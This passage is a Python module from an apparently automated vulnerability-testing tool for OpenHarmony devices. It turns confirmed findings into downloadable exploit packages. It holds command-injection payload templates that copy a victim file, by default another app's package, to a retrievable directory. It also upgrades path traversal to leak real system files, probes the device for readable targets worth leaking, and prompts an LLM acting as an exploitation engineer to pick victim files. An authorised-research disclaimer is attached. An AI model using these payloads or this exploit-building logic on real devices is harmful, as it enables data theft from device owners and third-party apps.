"""交付物打包（PoC + Exp）：动态测试 CONFIRMED 后生成可供用户下载的完整利用包。

结构（<run_dir>/deliverables/）：
  poc.hap                PoC 触发应用（复用 PoC 执行时已签名的 HAP）
  exp.hap                Exp 利用应用（载荷升级：证明对目标数据的实际控制）
  contract_poc.json      PoC 契约（协议字段 / 帧序列 / 守卫 / 预言机）
  contract_exp.json      Exp 契约（升级后的载荷与预期效果物）
  evidence_exp.json      Exp 执行验证证据（reachability / oracle / 文件快照）
  README.md              使用说明（构建来源、载荷说明、复现步骤、免责声明）

设计约束：
- Exp 契约由 PoC 契约深拷贝 + 载荷升级生成——确定性模板保证总可产出；
  LLM 增强（victim 路径推断）成功才替换，失败静默回退模板默认值。
- path_traversal 的升级形态与注入型不同：攻击者控制的是"目标进程读取哪个
  路径"而非 shell 命令——升级 = 把读取目标从本轮预埋文件换成设备真实系统
  文件，内容外泄至输出面即任意读证明（oracle 为 exfil 内容差分，非 create）。
  读取目标由设备探测产生（真实文件），LLM 只做挑选（失败回退探测序）。
- Exp 验证复用 Runner 同款管线原语（预埋/native 发送/输出面扫描/hilog 过滤），
  不另起执行路径——诚实证据，不做无验证的"纸面 exp"。
- 打包失败绝不影响主测试结果：所有异常折叠为 deliverables 缺席 + stderr 日志。
"""

from __future__ import annotations

import copy
import hashlib
import json
import os
import shutil
import stat
import zipfile
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

# vuln_class → exp 载荷升级模板（确定性）。
# payload 模板中的 {victim} 由 LLM 增强或默认值填充；{dst} 是取回落点。
# 约束：载荷必须通过协议守卫（如 smartperf 字面量），前缀守卫值从 PoC 契约原样保留。
_EXP_PAYLOAD_TEMPLATES: dict[str, str] = {
    # 命令注入 → 把受害者文件复制到可取回目录（证明任意读 / 域内数据控制）。
    # 载荷内分隔用**字面 TAB**（UDP 文本帧不可含空格路径的解析约束，见
    # dynamictest PoC 记录："载荷注入段无空格;TAB 内部分隔,sh 仍作 IFS"）。
    "command_injection": 'cp\t{victim}\t{dst};#',
    # 任意文件写 → 在受控目录落地探针文件（证明任意写）
    "arbitrary_file_write": 'touch {dst};#',
}
_EXP_DEFAULT_VICTIM = "/data/app/el1/bundle/public/com.tencent.wechat/entry.hap"
# 设备侧恒存在且进程自身可读的兜底 victim：/proc/self/attr/current 是进程的
# SELinux label（如 u:r:SP_daemon:s0），读取它即证明注入命令以目标进程身份执行。
_EXP_FALLBACK_VICTIM = "/proc/self/attr/current"
_EXP_DEFAULT_DST = "/data/local/tmp/vf_exp_takeout"
_EXP_GUARDS = ("smartperf",)  # 协议守卫字面量（升级载荷必须保留）
_EXP_NOTE_LLM_PROMPT_MAX = 400

# 完整源码交付的边界。HAP 构建目录中会同时出现签名材料、缓存和主机相关
# 配置；这些不是 PoC/Exp 源码，不能随交付物暴露。源文件本身使用受限的
# 递归快照，并生成 manifest + zip，前端可在线浏览或一次性下载。
_SOURCE_SKIP_DIRS = frozenset({".hvigor", "build", "signing", "node_modules", ".git"})
_SOURCE_SKIP_FILES = frozenset({"local.properties", "hvigor-build.log", "sign.log"})
_SOURCE_MAX_FILES = 512
_SOURCE_MAX_BYTES = 16 * 1024 * 1024

# ---------------------------------------------------------------------------
# P2 动态 victim 探测（全自动化收敛）：静态兜底候选清单 → 设备动态探测。
# 固化清单的局限：换设备/换镜像后清单可能整体失效（文件不存在）→ Exp 永远
# 落 probe_first 之外的空集 → skipped。动态探测用只读白名单命令枚举目标域
# 可读的真实文件，候选总是来自"本台设备当下真实存在"的集合。
# ---------------------------------------------------------------------------

# 动态探测目录（只读 ls，逐层受限；探测失败静默跳过该目录）
_PT_PROBE_DIRS = (
    "/system/etc/hiview",
    "/data/log/eventlog",
    "/data/log/faultlog",
)
_PT_PROBE_MAX_CANDIDATES = 6   # 候选上限（喂给 LLM 挑选的清单长度）
_PT_PROBE_MIN_SIZE = 64        # 太小（空文件）的没有外泄价值
_PT_PROBE_MAX_SIZE = 1_000_000  # 太大（日志巨文件）的指纹提取与 cat 都不可靠


def _probe_pt_victims_dynamic(hdc) -> list[str]:
    """设备动态探测 victim 候选：ls 目标域目录 → 过滤大小 → 静态清单兜底。

    返回保序去重候选列表（上限 _PT_PROBE_MAX_CANDIDATES）。全部失败时回落
    _PT_FALLBACK_VICTIMS 静态清单（仍由 _probe_device_files 二次确认存在性）。
    """
    candidates: list[str] = []
    if hdc is not None:
        for d in _PT_PROBE_DIRS:
            try:
                rec = hdc.run(["shell", "ls", d], purpose="exp:probe-pt-dir")
                if rec.returncode != 0 or "No such file" in rec.stdout:
                    continue
                for name in rec.stdout.splitlines():
                    name = name.strip()
                    if not name or name.startswith("."):
                        continue
                    path = f"{d.rstrip('/')}/{name}"
                    if not path.startswith("/") or ".." in path.split("/"):
                        continue
                    # stat 过滤：太小无外泄价值，太大不可靠
                    stat_rec = hdc.run(["shell", "stat", "-c", "%s", path],
                                       purpose="exp:probe-pt-stat")
                    try:
                        size = int(stat_rec.stdout.strip().splitlines()[0])
                    except (ValueError, IndexError):
                        continue
                    if _PT_PROBE_MIN_SIZE <= size <= _PT_PROBE_MAX_SIZE and path not in candidates:
                        candidates.append(path)
                        if len(candidates) >= _PT_PROBE_MAX_CANDIDATES:
                            return candidates
            except Exception:  # noqa: BLE001 — 单目录失败不阻断探测
                continue
    return candidates


# P2 守卫泛化：从 PoC 契约 field_values 提取守卫字面量（首个小写协议路由键的
# 值前缀，如 set_pkgName=smartperf 的 "smartperf"）；提取不到回落静态 _EXP_GUARDS。
_KNOWN_NON_GUARD_KEYS = frozenset((
    "mode", "host", "port", "target", "local_path", "marker",
    "catch_network_traffic", "frame_first_template", "frame_second",
))


def _extract_guards_from_poc(poc_contract: dict[str, Any]) -> tuple[str, ...]:
    """PoC 契约 → 守卫字面量元组（确定性提取，失败回落静态表）。

    规则：field_values 中首个非槽位字符串值，取其首个 '::' 段前缀或首 token
    （协议路由字面量，如 "smartperf" / "set_pkgName::" 的前缀）。
    """
    try:
        fvs = poc_contract.get("protocol", {}).get("field_values", {})
        for key, val in fvs.items():
            if key in _KNOWN_NON_GUARD_KEYS or not isinstance(val, str) or not val:
                continue
            token = val.split("::", 1)[0].split(";")[0].strip()
            # 合理守卫形态：短小写字母数字字面量（路由名），不是路径/占位符/长载荷
            if (token and token.isalnum() and token.islower() and len(token) <= 32
                    and "__" not in token and "/" not in token):
                return (token,)
    except Exception:  # noqa: BLE001 — 提取失败回落静态表
        pass
    return _EXP_GUARDS


@dataclass
class ExpPackage:
    """一次交付物打包的结果（成功/失败皆可序列化）。"""

    status: str = ""                    # packaged / skipped / failed
    reason: str = ""                    # skipped/failed 原因
    deliverables_dir: str = ""          # 落盘目录
    files: list[dict[str, Any]] = field(default_factory=list)  # [{name, path, bytes}]
    exp_verdict: dict[str, Any] = field(default_factory=dict)
    exp_payload: str = ""               # 升级后的注入载荷（展示用）
    victim_path: str = ""               # exp 读取的受害文件
    victim_source: str = ""             # llm / template_default
    source_snapshots: dict[str, Any] = field(default_factory=dict)

    def to_dict(self) -> dict[str, Any]:
        return {
            "status": self.status,
            "reason": self.reason,
            "deliverables_dir": self.deliverables_dir,
            "files": self.files,
            "exp_verdict": self.exp_verdict,
            "exp_payload": self.exp_payload,
            "victim_path": self.victim_path,
            "victim_source": self.victim_source,
            "source_snapshots": self.source_snapshots,
        }


def _package_source_snapshot(source_project: Path | None, out_dir: Path,
                             kind: str) -> dict[str, Any]:
    """复制一个 HAP 工程的可交付源码，并生成 manifest/zip。

    这里只收集构建输入和源码，不收集 .hvigor/build/signing 等生成物，也不
    跟随符号链接。这样既能让用户查看完整项目，又不会把主机 SDK、签名私钥
    或构建缓存带进 Web 交付目录。
    """
    if source_project is None or not source_project.is_dir():
        return {}
    if kind not in {"poc", "exp"}:
        return {}
    root = out_dir / f"{kind}_source"
    if root.exists():
        shutil.rmtree(root)
    root.mkdir(parents=True, exist_ok=True)
    entries: list[dict[str, Any]] = []
    excluded: list[str] = []
    total = 0
    for current, dirs, names in os.walk(source_project, topdown=True, followlinks=False):
        current_path = Path(current)
        kept_dirs: list[str] = []
        for dirname in sorted(dirs):
            src_dir = current_path / dirname
            rel_dir = src_dir.relative_to(source_project).as_posix()
            if dirname in _SOURCE_SKIP_DIRS or src_dir.is_symlink() or not src_dir.is_dir():
                excluded.append(rel_dir)
                continue
            kept_dirs.append(dirname)
        dirs[:] = kept_dirs
        for filename in sorted(names):
            src = current_path / filename
            rel = src.relative_to(source_project).as_posix()
            if filename in _SOURCE_SKIP_FILES:
                excluded.append(rel)
                continue
            try:
                info = src.lstat()
            except OSError:
                continue
            if src.is_symlink() or not stat.S_ISREG(info.st_mode):
                excluded.append(rel)
                continue
            if len(entries) >= _SOURCE_MAX_FILES or total + info.st_size > _SOURCE_MAX_BYTES:
                excluded.append(rel)
                continue
            dest = root / Path(rel)
            dest.parent.mkdir(parents=True, exist_ok=True)
            try:
                shutil.copyfile(src, dest)
            except OSError:
                excluded.append(rel)
                continue
            digest = hashlib.sha256(dest.read_bytes()).hexdigest()
            entries.append({"path": rel, "bytes": info.st_size, "sha256": digest})
            total += info.st_size

    # 为被安全过滤的本地配置提供可复制的占位说明，不泄露本机绝对路径。
    if (source_project / "local.properties").is_file():
        example = root / "local.properties.example"
        example.write_text("sdk.dir=<OpenHarmony SDK 路径>\nnodejs.dir=<Node.js 路径>\n",
                           encoding="utf-8")
        digest = hashlib.sha256(example.read_bytes()).hexdigest()
        entries.append({"path": "local.properties.example", "bytes": example.stat().st_size,
                        "sha256": digest})
        total += example.stat().st_size

    archive = out_dir / f"{kind}_source.zip"
    with zipfile.ZipFile(archive, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for item in entries:
            path = root / item["path"]
            zf.write(path, arcname=f"{kind}_source/{item['path']}")
    manifest = {
        "schema_version": 1,
        "kind": kind,
        "root": f"{kind}_source",
        "file_count": len(entries),
        "total_bytes": total,
        "limits": {"max_files": _SOURCE_MAX_FILES, "max_bytes": _SOURCE_MAX_BYTES},
        "excluded": sorted(set(excluded)),
        "files": entries,
    }
    manifest_path = out_dir / f"{kind}_source_manifest.json"
    manifest_path.write_text(json.dumps(manifest, ensure_ascii=False, indent=2), encoding="utf-8")
    return {
        "kind": kind,
        "root": str(root),
        "archive": str(archive),
        "manifest": str(manifest_path),
        "files": entries,
        "file_count": len(entries),
        "total_bytes": total,
        "excluded_count": len(set(excluded)),
    }


def _register_source_snapshot_files(out_dir: Path, snapshot: dict[str, Any],
                                    files: list[dict[str, Any]]) -> None:
    """把源码快照的压缩包和 manifest 加入直接交付文件清单。"""
    if not snapshot:
        return
    kind = snapshot.get("kind", "")
    for name in (f"{kind}_source.zip", f"{kind}_source_manifest.json"):
        path = out_dir / name
        if path.is_file():
            files.append({"name": name, "path": str(path), "bytes": path.stat().st_size})


def _llm_victim_path(binding_pair, finding: Any, contract_dict: dict[str, Any]) -> str | None:
    """LLM 增强推断受害文件路径（一步、短输出、失败即回退模板默认值）。"""
    if binding_pair is None:
        return None
    try:
        binding, simple_text = binding_pair
        prompt = (
            "你是漏洞利用工程师。以下是一条已确认的命令注入漏洞的 sink 与协议上下文：\n"
            f"sink: {contract_dict.get('sink', '')}\n"
            f"vuln_class: {finding.vuln_class}\n"
            "在 OpenHarmony 设备上（user build、非 root、SELinux enforcing），SP_daemon 域可读的"
            "、能证明『注入命令以 SP_daemon 权限执行』的**单个现有文件路径**是什么？"
            "要求：1) 绝对路径；2) 该域大概率可读；3) 只输出 JSON："
            '{"victim_path": "/data/...", "reason": "不超过100字"}。不要输出其他文字。'
        )
        text = simple_text(binding, prompt, system="只输出一个 JSON 对象。", max_tokens=4000)
        start = text.find("{")
        end = text.rfind("}")
        if start < 0 or end <= start:
            return None
        data = json.loads(text[start:end + 1])
        victim = str(data.get("victim_path", "")).strip()
        if victim.startswith("/") and len(victim) < 256 and ".." not in victim:
            return victim
        return None
    except Exception:  # noqa: BLE001 — LLM 增强是可选路径，任何失败回退模板
        return None


# ---------------------------------------------------------------------------
# path_traversal 升级（LLM 起草 + 确定性校验 + 设备实测，非查表模板）：
# 攻击者控制的是"目标进程读取哪个路径"——Exp = 把 PoC 契约里"读取本轮预埋
# 文件"的路径槽位换成设备真实系统文件，其内容经目标进程处理流入输出面
# （读回即任意读证明）。oracle 从 create/exfil(预埋内容) 换成 exfil(目标文件
# 内容差分)。生成即验证：候选在板卡实测，effect_observed=false 不谎报成功。
# ---------------------------------------------------------------------------

# path_traversal 升级读取目标探测序（确定性兜底）：hiview 域可读的设备真实
# 文件，逐个探测存在性，首个命中者作为 LLM 失败/未选时的回退。
# /system/etc/hiview/ 下配置文件由 hiview 自身读取，SELinux 必然放行同域读。
_PT_FALLBACK_VICTIMS = (
    "/system/etc/hiview/hisysevent.cfg",
    "/system/etc/hiview/freeze_rules.xml",
    "/system/etc/hiview/event_logger_config",
    "/system/etc/hiview/BUILD.gn",
)
# 路径槽位候选键：PoC 契约 field_values / param_space 中"指向预埋文件的读取
# 路径"字段（Exp 时替换为真实系统文件）。优先匹配已知槽位名，其次含 _FILE/
# _PATH 且值为 __*_FILE__ 占位符的字段。
_PT_PATH_SLOT_KEYS = ("FREEZE_INFO_PATH", "src_file_path", "read_path", "target_file")
_PT_EXP_SYSTEM_PROMPT = "只输出一个 JSON 对象。"


def _probe_device_files(hdc, candidates: tuple[str, ...]) -> list[str]:
    """逐个 ls 探测候选文件，返回设备上真实存在的（保序）。探测失败不阻断。"""
    ok: list[str] = []
    for path in candidates:
        if not path.startswith("/") or ".." in path.split("/"):
            continue
        try:
            rec = hdc.run(["shell", "ls", path], purpose="exp:probe-pt-victim")
            if rec.returncode == 0 and "No such file" not in rec.stdout:
                ok.append(path)
        except Exception:  # noqa: BLE001 — 探测失败不阻断打包
            continue
    return ok


def _llm_pick_pt_victim(binding_pair, poc_contract: dict[str, Any],
                        existing: list[str]) -> str | None:
    """LLM 从设备真实存在的文件中挑选升级读取目标（一步、短输出、失败回退）。

    输入只给"已验证存在"的候选与 PoC 契约说明，LLM 的职责是挑选而非发明
    路径——幻觉被白名单挡住（输出不在 existing 里就丢弃）。
    """
    if binding_pair is None or not existing:
        return None
    try:
        binding, simple_text = binding_pair
        prompt = (
            "你是漏洞利用工程师。一条已确认的路径穿越漏洞（目标进程按攻击者提供的"
            "路径读取文件），PoC 只读取测试预埋文件。现在升级为 Exp：把读取目标换成"
            "设备上真实系统文件，证明目标进程以自身权限读了攻击者指定的任意文件。\n"
            f"PoC 契约说明：{str(poc_contract.get('description', ''))[:200]}\n"
            "以下文件在目标设备上已实测存在（从中挑一个外泄价值最高的）：\n"
            + "\n".join(f"- {p}" for p in existing)
            + "\n要求：只输出 JSON：{\"victim_path\": \"...\", \"reason\": \"不超过80字\"}。"
        )
        text = simple_text(binding, prompt, system=_PT_EXP_SYSTEM_PROMPT, max_tokens=4000)
        start = text.find("{")
        end = text.rfind("}")
        if start < 0 or end <= start:
            return None
        data = json.loads(text[start:end + 1])
        victim = str(data.get("victim_path", "")).strip()
        # 白名单核对：LLM 只能从已验证存在的候选里挑，不许发明
        if victim in existing:
            return victim
        return None
    except Exception:  # noqa: BLE001 — LLM 挑选是可选路径，失败回退探测序
        return None


def _find_pt_path_slots(poc_contract: dict[str, Any]) -> list[str]:
    """定位 PoC 契约中"读取路径"槽位的字段名（确定性扫描）。

    命中规则（按序）：① 已知槽位名；② field_values 中值为 __*_FILE__ 占位符
    且键名含 PATH/FILE 的字段。返回 field_values 键名列表（保持原序）。
    """
    fvs = poc_contract.get("protocol", {}).get("field_values", {})
    slots: list[str] = []
    for key in _PT_PATH_SLOT_KEYS:
        if key in fvs:
            slots.append(key)
    if not slots:
        for key, val in fvs.items():
            if key in ("mode", "host", "port", "target", "local_path", "marker"):
                continue
            if isinstance(val, str) and val.startswith("__") and val.endswith("__"):
                if any(tok in key.upper() for tok in ("PATH", "FILE", "INFO")):
                    slots.append(key)
    return slots


def _build_exp_contract(poc_contract: dict[str, Any], vuln_class: str,
                        victim_path: str, dst_path: str) -> dict[str, Any] | None:
    """PoC 契约 → Exp 契约：替换注入载荷为升级版，预言机改为 dst 落地证明。"""
    template = _EXP_PAYLOAD_TEMPLATES.get(vuln_class)
    if template is None:
        return None
    exp = copy.deepcopy(poc_contract)
    payload = template.format(victim=victim_path, dst=dst_path)
    for guard in _extract_guards_from_poc(poc_contract):
        if guard in poc_contract.get("protocol", {}).get("field_values", {}).get("set_pkgName", ""):
            # 守卫字面量必须出现在载荷开头（如 smartperf 双重校验）
            if not payload.startswith(guard):
                payload = guard + ";" + payload
            break
    proto = exp.get("protocol", {})
    fvs = proto.get("field_values", {})
    # 第一帧字段承载升级载荷（与 PoC 同字段名，仅值替换）。
    # 关键：线路帧模板（param_space.frame_first_template）往往带协议路由前缀
    # （如 SP_daemon 的 "set_pkgName::"——没有它报文不会被分发到目标分支）。
    # 因此必须在 PoC 原模板里**原位替换**载荷段，保留前缀，而不是裸写载荷。
    first_key = next((k for k, v in fvs.items() if k == "set_pkgName"), None)
    if first_key is None:
        first_key = next((k for k in fvs if k not in ("mode", "host", "port", "catch_network_traffic")), None)
    if first_key is None:
        return None
    old_payload = str(fvs.get(first_key, ""))
    fvs[first_key] = payload
    ps = proto.setdefault("param_space", {})
    if "frame_first_template" in ps:
        poc_tpl = str(ps.get("frame_first_template") or "")
        if old_payload and old_payload in poc_tpl:
            ps["frame_first_template"] = poc_tpl.replace(old_payload, payload)
        else:
            # PoC 模板不含载荷原值（结构异常）：退化为模板加前缀 + 载荷
            prefix = poc_tpl[:poc_tpl.find(old_payload)] if old_payload and old_payload else poc_tpl
            ps["frame_first_template"] = prefix + payload if prefix else payload
    exp["contract_id"] = str(exp.get("contract_id", "")).replace("GEN-", "EXP-", 1)
    exp["oracle"] = {
        "kind": "artifact_differential",
        "artifact_forms": [
            {"form": "create", "path": dst_path, "content_note": f"从 {victim_path} 复制落地的文件"}
        ],
        "hilog_expectations": [],
        "evidence": f"Exp 效果：以 SP_daemon 权限读取 {victim_path} 并复制到 {dst_path}（可 hdc file recv 取回）。",
    }
    exp["fault"] = {
        "operator": "payload_value_substitution",
        "description": f"Exp 升级载荷：{payload}",
        "evidence": poc_contract.get("fault", {}).get("evidence", ""),
        "expected_guards": poc_contract.get("fault", {}).get("expected_guards", []),
    }
    exp["description"] = (
        f"Exp 利用契约（由 PoC 契约 {poc_contract.get('contract_id', '')} 升级）："
        f"以目标进程权限读取 {victim_path} 并复制到 {dst_path}。"
    )
    return exp


def _build_pt_exp_contract(poc_contract: dict[str, Any], victim_path: str,
                           src_file_dir: str) -> dict[str, Any] | None:
    """path_traversal 专用：PoC 契约 → 任意读 Exp 契约（读取目标 = 设备真实文件）。

    与注入型的差异：不改注入载荷（路径穿越没有命令段），而是把"读取路径"
    槽位从预埋占位符换成 victim 真实路径；oracle 从"预埋内容外泄/删除"换成
    "victim 内容外泄"（exfil，content_contains=victim 文件的确定性子串）。
    保持 PoC 的双路径结构不变（如 FREEZE_INFO_PATH 的 stack,cpu 形态）——
    只替换承载读取目标的 cpu 段，stack 段仍指向预埋文件满足链路前置。
    """
    slots = _find_pt_path_slots(poc_contract)
    if not slots:
        return None
    exp = copy.deepcopy(poc_contract)
    proto = exp.get("protocol", {})
    fvs = proto.setdefault("field_values", {})
    ps = proto.setdefault("param_space", {})

    # victim 内容指纹：预埋阶段回读真实文件取确定性子串（8~24 字节段），
    # 不依赖 LLM 猜测内容。这里先声明用 pattern 占位语义——runner 的
    # preplant 机制不适用（victim 是系统文件，不能预埋），故 oracle 直接用
    # hilog 外泄核对 + 输出面内容核对双通道；content 指纹由执行验证阶段
    # 实测提取（见 _verify_pt_exp），契约里标注待定指纹键。
    slot = slots[0]
    old_val = str(fvs.get(slot, ""))
    # 双路径形态（如 "stack,cpu"）：只替换最后一段（读取目标段）；单路径整体替换
    parts = old_val.split(",")
    if len(parts) >= 2:
        parts[-1] = victim_path
        new_val = ",".join(parts)
    else:
        new_val = victim_path
    fvs[slot] = new_val
    # 同步 param_space 模板（若模板里含旧值原样替换）
    for key in ("frame_first_template", "frame_second"):
        tpl = str(ps.get(key) or "")
        if old_val and old_val in tpl:
            ps[key] = tpl.replace(old_val, new_val)

    # param_space 调整：src_file_dir/preplant 保留（stack 段仍需预埋），
    # note 追加 Exp 语义说明；victim 加入预埋豁免清单——runner 对豁免路径
    # 跳过 rm -f 清理与 exfil 预埋写入（系统文件只读且绝不可写，run 5a970e
    # 实测预埋 /system/etc/hiview/* 必然 OracleError），快照核对照常进行。
    ps["exp_no_plant_paths"] = [victim_path]
    # 【preplant 占位符还原】build_deliverables 拿到的 poc_contract 是编译后
    # to_dict 的产物：preplant 里已是上一轮 run 展开后的**具体路径**（如
    # /data/log/eventlog/vf_vf-<poc_run_id>_src.txt），而 field_values 仍保留
    # __STACK_FILE__ 占位符（run 20815b 实证：Exp run 发送的 stack 段展开为
    # 本 run 路径，预埋的却是 PoC run 的旧路径 → stack 文件不存在 →
    # InitLogBody 失败 → 全链挂）。从 field_values 反占位符引用重建 preplant。
    fv_blob = " ".join(str(v) for v in fvs.values() if isinstance(v, str))
    ph_refs: list[str] = []
    for ph in ("__STACK_FILE__", "__CPU_FILE__", "__SRC_FILE__"):
        if ph in fv_blob and ph not in ph_refs:
            ph_refs.append(ph)
    if ph_refs:
        ps["preplant"] = ph_refs
    note = str(ps.get("note", ""))
    ps["note"] = (
        f"[EXP] 读取目标已升级为设备真实文件 {victim_path}（任意读证明）；"
        f"其余结构沿用 PoC。{note[:200]}"
    )

    exp["contract_id"] = str(exp.get("contract_id", "")).replace("GEN-", "EXP-", 1)
    # oracle：victim 内容外泄差分。content_contains 由执行验证阶段回读 victim
    # 后回填（指纹必须来自实测而非猜测）；hilog 期望沿用 PoC（输出面生成日志）。
    oracle = exp.get("oracle", {})
    forms = oracle.get("artifact_forms", [])
    for form in forms:
        if form.get("form") == "exfil":
            form["path"] = victim_path
            form["content_contains"] = "__PT_VICTIM_FINGERPRINT__"
        elif form.get("form") == "delete":
            # 真实系统文件绝不能删——Exp 只证明"读"，删除形态从 Exp oracle 移除
            form["form"] = "__PT_DROP__"
    oracle["artifact_forms"] = [f for f in forms if f.get("form") != "__PT_DROP__"]
    if not oracle["artifact_forms"]:
        return None
    oracle["evidence"] = (
        f"Exp 效果：目标进程按攻击者路径读取 {victim_path}，内容外泄至输出面"
        f"（内容差分核对，指纹实测提取）。"
    )
    exp["oracle"] = oracle
    exp["fault"] = {
        "operator": "payload_value_substitution",
        "description": f"[EXP] 读取路径槽位 {slot} 的目标段替换为 {victim_path}",
        "evidence": poc_contract.get("fault", {}).get("evidence", ""),
        "expected_guards": poc_contract.get("fault", {}).get("expected_guards", []),
    }
    exp["description"] = (
        f"Exp 利用契约（由 PoC 契约 {poc_contract.get('contract_id', '')} 升级）："
        f"诱导目标进程读取系统文件 {victim_path} 并外泄其内容（任意读证明）。"
    )
    return exp


def _write_readme(out_dir: Path, poc_contract: dict[str, Any], exp_contract: dict[str, Any],
                  exp_verdict: dict[str, Any], victim_source: str) -> None:
    lines = [
        "# VulnFounder 动态测试交付物",
        "",
        f"- PoC 契约：`{poc_contract.get('contract_id', '')}`（协议 `{poc_contract.get('protocol', {}).get('descriptor_id', '')}`）",
        f"- Exp 契约：`{exp_contract.get('contract_id', '')}`",
        "",
        "## 文件清单",
        "",
        "| 文件 | 说明 |",
        "|---|---|",
        "| poc.hap | PoC 触发应用（安装即按契约发送报文，复现漏洞触发路径） |",
        "| exp.hap | Exp 利用应用（升级载荷：证明对目标数据的实际控制） |",
        "| contract_poc.json | PoC 契约（协议字段 / 帧序列 / 绕过的守卫 / 预言机） |",
        "| contract_exp.json | Exp 契约（升级后的载荷） |",
        "| evidence_exp.json | Exp 在板卡上的执行验证证据 |",
        "| poc_source.zip | PoC 完整工程源码压缩包（可离线下载） |",
        "| exp_source.zip | Exp 完整工程源码压缩包（可离线下载） |",
        "| poc_source_manifest.json | PoC 源码文件清单、大小和 SHA-256 |",
        "| exp_source_manifest.json | Exp 源码文件清单、大小和 SHA-256 |",
        "| poc_source/ | PoC 在线浏览源码目录 |",
        "| exp_source/ | Exp 在线浏览源码目录 |",
        "",
        "## Exp 载荷说明",
        "",
        "```",
        exp_contract.get("fault", {}).get("description", ""),
        "```",
        f"- 受害文件路径来源：{'LLM 推断' if victim_source == 'llm' else '模板默认值'}",
        "",
        "## 复现步骤",
        "",
        "1. 安装：`hdc -t <serial> install poc.hap`（或 exp.hap 验证利用效果）",
        "2. 启动：`hdc -t <serial> shell aa start -b com.security.research.trigger -a EntryAbility`",
        "3. 观察：按契约 oracle（marker 文件 / 落地文件）检查效果，例如：",
        "   `hdc -t <serial> shell ls -l <artifact path>`",
        "4. 取回（Exp）：`hdc -t <serial> file recv <dst path> ./takeout.bin`",
        "",
        "## 免责声明",
        "",
        "本交付物仅用于已授权设备上的安全研究与漏洞验证。",
    ]
    (out_dir / "README.md").write_text("\n".join(lines), encoding="utf-8")


def build_deliverables(
    *,
    run_dir: Path,
    poc_contract: dict[str, Any],
    poc_hap: Path | None,
    vuln_class: str,
    finding: Any,
    hdc,                                   # HDCClient（Exp 执行复用）
    binding_pair=None,                     # LLM 增强（可 None → 模板默认）
    progress_emit=None,                    # 进度事件回调（复用 recon/runner 通道）
) -> ExpPackage:
    """CONFIRMED 后打包 PoC+Exp 交付物；任何失败返回 skipped/failed 而不抛出。"""
    try:
        out_dir = run_dir / "deliverables"
        out_dir.mkdir(parents=True, exist_ok=True)
        emit = (lambda detail, rec=None: progress_emit({"event": "deliverable",
                                                        "detail": detail,
                                                        "record": rec or {}})) if progress_emit else (lambda *a, **k: None)
        # 1. victim 路径：LLM 增强 → 设备实测校验 → 模板默认。
        # 校验很关键：LLM 会猜出"看似合理但设备上不存在"的路径（如实测猜出
        # /data/log/hilog/hilog，实际只有轮转 .gz），cp 源不存在 = 效果必然失败。
        # /proc/self/attr/current 恒存在且可读（进程自身 SELinux label），
        # 是"注入命令以 SP_daemon 权限执行"的最可靠证明物。
        victim = _llm_victim_path(binding_pair, finding, poc_contract)
        victim_source = "llm" if victim else "template_default"
        victim = victim or _EXP_DEFAULT_VICTIM
        dst = f"{_EXP_DEFAULT_DST}_{poc_contract.get('contract_id', 'x').replace('GEN-', '')}"
        if hdc is not None:
            try:
                probe = hdc.run(["shell", "ls", victim], purpose="exp:probe-victim")
                if probe.returncode != 0 or "No such file" in probe.stdout:
                    emit(f"victim {victim} 设备上不存在，回退 {_EXP_FALLBACK_VICTIM}")
                    victim = _EXP_FALLBACK_VICTIM
                    victim_source = "fallback_probe"
            except Exception:  # noqa: BLE001 — 探测失败不阻断打包
                pass
        emit(f"Exp 载荷目标文件：{victim}（{victim_source}）")
        # 2. Exp 契约：注入型查表模板；path_traversal / information_disclosure
        # 走专用构造（读取目标升级）。两类共用一套 Exp 的原因（run e5b30b12 实证）：
        # adapter 对 FreezeManager 案例的归类在两轮间漂移（path_traversal ↔
        # information_disclosure），但攻击链同族——都是"控制目标进程读取路径"，
        # Exp 形态一致：把读取目标换成设备真实系统文件。
        if vuln_class in ("path_traversal", "information_disclosure"):
            exp_contract = _build_path_traversal_exp(
                poc_contract=poc_contract, finding=finding, hdc=hdc,
                binding_pair=binding_pair, emit=emit, run_dir=run_dir,
            )
        else:
            exp_contract = _build_exp_contract(poc_contract, vuln_class, victim, dst)
        if exp_contract is None:
            return ExpPackage(status="skipped", reason=f"vuln_class {vuln_class} 暂无 Exp 载荷模板",
                              deliverables_dir=str(out_dir))
        if vuln_class in ("path_traversal", "information_disclosure"):
            # path_traversal 的 Exp 执行验证在 _build_path_traversal_exp 内已完成
            # （native 载体直发 + 输出面指纹核对），此处只落契约与证据文件。
            evidence = exp_contract.pop("_evidence", {})
            (out_dir / "evidence_exp.json").write_text(
                json.dumps(evidence, ensure_ascii=False, indent=2), encoding="utf-8")
            files: list[dict[str, Any]] = []
            if poc_hap and poc_hap.is_file():
                poc_target = out_dir / "poc.hap"
                if poc_hap.resolve() != poc_target.resolve():
                    shutil.copy2(poc_hap, poc_target)
                files.append({"name": "poc.hap", "path": str(poc_target),
                              "bytes": poc_target.stat().st_size})
            exp_hap_path = evidence.get("exp_hap_path", "")
            if exp_hap_path and Path(exp_hap_path).is_file():
                _reg_local = Path(exp_hap_path)
                exp_target = out_dir / "exp.hap"
                if _reg_local.resolve() != exp_target.resolve():
                    shutil.copy2(_reg_local, exp_target)
                files.append({"name": "exp.hap", "path": str(exp_target),
                              "bytes": exp_target.stat().st_size})
            source_snapshots: dict[str, Any] = {}
            poc_snapshot = _package_source_snapshot(
                (poc_hap.parent / "project") if poc_hap else None, out_dir, "poc")
            exp_snapshot = _package_source_snapshot(
                (Path(exp_hap_path).parent / "project") if exp_hap_path else None,
                out_dir, "exp")
            if poc_snapshot:
                source_snapshots["poc"] = poc_snapshot
            if exp_snapshot:
                source_snapshots["exp"] = exp_snapshot
            (out_dir / "contract_exp.json").write_text(
                json.dumps(exp_contract, ensure_ascii=False, indent=2), encoding="utf-8")
            (out_dir / "contract_poc.json").write_text(
                json.dumps(poc_contract, ensure_ascii=False, indent=2), encoding="utf-8")
            _write_readme(out_dir, poc_contract, exp_contract, evidence,
                          evidence.get("victim_source", "probe"))
            for name in ("README.md", "evidence_exp.json", "contract_poc.json",
                         "contract_exp.json"):
                p = out_dir / name
                if p.is_file():
                    files.append({"name": name, "path": str(p), "bytes": p.stat().st_size})
            _register_source_snapshot_files(out_dir, poc_snapshot, files)
            _register_source_snapshot_files(out_dir, exp_snapshot, files)
            return ExpPackage(
                status="packaged", deliverables_dir=str(out_dir), files=files,
                exp_verdict=evidence,
                exp_payload=exp_contract["fault"]["description"],
                victim_path=evidence.get("victim_path", ""),
